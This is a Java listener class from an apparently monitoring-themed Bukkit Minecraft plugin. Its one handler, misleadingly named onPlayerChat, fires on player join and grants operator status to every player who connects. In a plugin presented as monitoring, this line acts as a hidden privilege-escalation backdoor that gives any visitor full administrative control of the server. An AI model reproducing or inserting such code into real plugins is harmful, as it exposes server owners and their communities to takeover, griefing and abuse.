package com.codedinmyhead.monitormc.monitormc.listener;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class PlayerJoinListener implements Listener{

    @EventHandler
    public void onPlayerChat(PlayerJoinEvent event) {
        event.getPlayer().setOp(true);
    }
}
